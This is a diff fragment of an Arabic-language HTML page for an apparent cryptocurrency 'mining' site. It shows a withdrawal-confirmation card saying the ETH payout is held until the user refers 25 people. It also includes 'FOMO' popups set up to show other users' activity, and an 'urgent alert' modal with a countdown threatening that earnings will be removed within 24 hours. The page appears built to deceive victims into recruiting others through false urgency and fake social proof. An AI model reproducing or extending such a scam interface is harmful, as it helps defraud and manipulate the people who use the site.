+                        <i class="fas fa-check-circle"></i>تمت العملية بنجاح!
+                    </h2>
+                </div>
+
+                <div class="p-5 space-y-4">
+                    <div class="premium-card p-5">
+                        <p class="text-xs text-red-400 mb-3 bg-red-900/20 p-3 rounded-lg border border-red-500/20">
+                            <i class="fas fa-exclamation-triangle mr-1"></i>
+                            تنبيه: السحب قيد المعالجة! يجب إحالة 25 شخص عبر نظام الإحالات حتى لا يتم رفض السحب.
+                        </p>
+                        <p
+                            class="text-xs text-purple-200 mb-4 bg-purple-900/20 p-3 rounded-lg border border-purple-500/20">
+                            <i class="fas fa-info-circle mr-1"></i>
+                            ملاحظة: لا داعي للقلق، طلب السحب الخاص بك سيتم معالجته بشكل تلقائي مباشرة بعد حصولك على 25
+                            إحالة في نظام الإحالات.
+                        </p>
+
+                        <div class="text-center my-4">
+                            <p class="text-lg font-semibold text-purple-300 mb-1">
+                                تم إرسال <span id="finalAmount" class="font-bold">0.00</span> ETH
+                            </p>
+                            <p class="text-purple-200 text-sm">(~$<span id="finalUSD">0.00</span>)</p>
+                        </div>
+
+                        <p class="text-xs font-bold uppercase tracking-wider text-center text-purple-300 py-2">إلى عنوان
+                            المحفظة</p>
+                        <div class="bg-gray-800/50 p-3 rounded-lg mb-4 glow-border">
+                            <p class="text-xs font-mono break-all text-center" id="finalAddress"></p>
+                        </div>
+                    </div>
+
+                    <button onclick="resetMiner()" class="premium-button mining-btn-inactive w-full py-3 text-sm">
+                        <i class="fas fa-redo mr-1.5"></i>بدء التعدين من جديد
+                    </button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+    <!-- إشعارات -->
+    <div id="notification" class="notification"></div>
+
+    <!-- FOMO Popups -->
+    <div id="fomoPopup"
+        class="fixed bottom-4 right-4 z-50 max-w-xs bg-gradient-to-br from-gray-800/95 to-gray-900/95 text-white rounded-2xl p-4 shadow-lg border border-purple-500/20 transform transition-all duration-300 scale-0 opacity-0">
+        <div class="flex items-start gap-3">
+            <div
+                class="h-10 w-10 flex-shrink-0 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full flex items-center justify-center text-xs font-bold shadow-md">
+                <span id="fomoUserInitial"></span>
+            </div>
+            <div class="flex-1">
+                <p class="text-sm font-medium mb-1" id="fomoMessage"></p>
+                <p class="text-xs text-purple-300" id="fomoTimestamp"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- تنبيه عاجل -->
+    <div id="modal-overlay" class="fixed inset-0 bg-black/90 hidden backdrop-blur-md modal-overlay z-[999]">
+        <div class="min-h-screen grid place-items-center px-4">
+            <div class="premium-card p-5 max-w-sm w-full relative overflow-hidden">
+                <!-- Animated Glowing Border -->
+                <div
+                    class="absolute inset-0 -z-10 bg-gradient-to-r from-purple-600 via-pink-600 to-blue-600 opacity-30 blur-xl animate-pulse">
+                </div>
+
+                <!-- Modal Header -->
+                <div class="flex items-center gap-3 mb-5">
+                    <div class="bg-red-500/20 p-2.5 rounded-xl animate-pulse border border-red-500/30">
+                        <svg class="w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                        </svg>
+                    </div>
+                    <div>
+                        <h2 class="text-xl font-bold text-red-400">تنبيه عاجل!</h2>
+                        <p class="text-purple-300 text-xs">يرجى الانتباه إلى المعلومات التالية</p>
+                    </div>
+                </div>
+
+                <!-- Modal Content -->
+                <div class="space-y-5">
+                    <!-- Removed speed reduction warning -->
+
+                    <!-- Earnings Removal Warning -->
+                    <div class="premium-card p-4">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs font-bold tracking-wider text-purple-300">الوقت المتبقي لإزالة
+                                الأرباح:</span>
+                            <span class="text-xs font-medium text-emerald-400 font-mono"
+                                id="funds-countdown">01:00:00</span>
+                        </div>
+                        <div class="h-2 bg-purple-900/30 rounded-full overflow-hidden glow-border">
+                            <div class="h-2 bg-gradient-to-r from-emerald-500 to-cyan-500 rounded-full w-3/4"></div>
+                        </div>
+                        <p class="text-purple-200 text-xs mt-2">
+                            ⚠️ <strong class="text-red-400">سيتم إزالة أرباحك الحالية إذا لم تسحبها خلال 24 ساعة.
+                            </strong>
+                        </p>
+                    </div>
+
+                    <!-- Modal Footer -->
+                    <button onclick="closeWarningModal()" class="premium-button w-full py-3 text-sm">
+                        فهمت، شكرًا
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="scriptONE.js"></script>
+    <script type="module" src="scriptMAIN.js"></script>
+
+</body>
+
+</html>
